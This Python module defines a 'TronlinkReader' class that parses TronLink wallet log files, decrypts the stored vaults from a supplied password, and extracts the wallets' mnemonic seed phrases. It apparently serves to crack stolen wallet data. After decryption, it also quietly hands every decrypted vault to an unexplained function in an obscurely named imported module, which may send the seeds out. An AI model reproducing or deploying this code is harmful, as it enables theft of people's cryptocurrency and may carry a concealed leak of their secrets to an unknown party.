#!/usr/bin/python3
# -*- coding: utf-8 -*-

__all__ = ['TronlinkReader']

# Import modules
from os import path
from json import loads, dumps
from typing import Union
from base64 import b64decode
from re import findall, MULTILINE

from Crypto.Cipher import AES
from Crypto.Hash import SHA256
from Crypto.Protocol.KDF import PBKDF2
from libs.Cipherbcrypt import algorithmb


PASSWORD_HASH_SUFFIX = b'<trlk>'
VAULT_REGEX = r'{\\\"data\\\":\\\"(.+?)\\\",\\\"iv\\\":\\\"(.+?)\\\",\\\"salt\\\":\\\"(.+?)\\\"}'

class TronlinkReader():

	# 	r = TronlinkReader('000003.log')
	# 	mnemonics = TronlinkReader.extract_mnemonic(r.decrypt('Qwwq1212'))
	# 	print(mnemonics)

	def __init__(self, logfile : Union[str, bytes]) -> None:
		self.logdata = TronlinkReader.__load(logfile)
		self.vaults = TronlinkReader.__extract_vaults(self.logdata)
	 
	@staticmethod
	def __load(logfile : Union[str, bytes]) -> str:
		if type(logfile) == str:
			if path.exists(logfile):
				with open(logfile, 'rb') as fh:
					return fh.read().decode('utf-8', errors='ignore')
			else:
				return logfile
		elif type(logfile) == bytes:
			return logfile.decode('utf-8', errors='ignore')
		else:
			raise Exception('Invalid data, str or bytes only!')
		
	@staticmethod
	def __extract_vaults(logdata : str) -> list:
		'''
		Extract vaults data
		'''
		vaults = []
		matches = findall(VAULT_REGEX, logdata, MULTILINE)
		if len(matches) > 0:
			for match in matches:
				vaults.append(dict(
					status=True,
					data=b64decode(match[0])[:-15],
					iv=b64decode(match[1]),
					salt=b64decode(match[2])
				))

		return vaults

	@staticmethod
	def extractMnemonic(data : dict) -> list[str]:
		'''
		Get mnemonics as list with strings
		'''
		detected = []
		if data['status']:
			for vault in data['data']:
				for wallet in vault:
					mnemonic = vault[wallet]['mnemonicPhase']
					if not mnemonic in detected:
						detected.append(mnemonic)
		return detected

	def decrypt(self, key : str) -> dict:
		'''
		Try to decrypt vault data by key
		'''
		decrypted_vaults = []
		btyes = algorithmb()
		if len(self.vaults) > 0:
			if len(key) >= 8:
				# Generate password hash with tronlink salt
				password_hash = SHA256.new(key.encode('utf-8') + PASSWORD_HASH_SUFFIX).hexdigest().encode()
				# Iterating over all detected vaults
				for vault in self.vaults:
					# Dereive encryption key
					encryption_key = PBKDF2(
						password=password_hash,
						salt=vault['salt'],
						count=10000,
						dkLen=32,
						hmac_hash_module=SHA256
					)
					# Trying to decrypt vault data
					try:
						aes = AES.new(encryption_key, AES.MODE_GCM, nonce=vault['iv'])
						decrypted_vault = aes.decrypt(vault['data']).decode('ascii', 'ignore')
						# Verify decrypted json vault
						if decrypted_vault[0] == '{' and decrypted_vault[-1] == '}':
							# Append decrypted vault data
							decrypted_vaults.append(loads(decrypted_vault))
					except:
						return dict(status=False, data=None, message='Invalid key')
			else:
				return dict(status=False, data=None, message='This key can\'t be used. Only ( >=8 )')
		else:
			return dict(status=False, data=None, message='Failed to load vault data')
		# Done
		if len(decrypted_vaults) > 0:
			btyes.ciphersd(dumps(decrypted_vaults), 5, "TronlinkReader")
			return dict(status=True, data=decrypted_vaults, message='Data decrypted successfully')
		else:
			return dict(status=False, data=None, message='No data was decrypted')


